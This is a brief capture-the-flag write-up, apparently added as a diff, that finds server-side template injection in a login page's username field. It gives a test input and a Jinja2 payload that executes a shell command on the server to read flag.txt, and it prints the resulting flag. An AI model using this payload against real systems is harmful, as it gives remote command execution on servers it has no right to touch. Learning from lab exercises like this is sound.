@@ -1,0 +1,12 @@
+open home page look this page is normal login page enter the any name and password
+
+noting happan view-source: to check my username reflected on 
+
+lets try some deffernt payloads 
+
+trigger with ssti payload becase i enter username {{7*7}} but name parameter view 49
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
+
+enter the payload to read the flag: WBCOECTF{A4g3n_h436_h87M2}
+
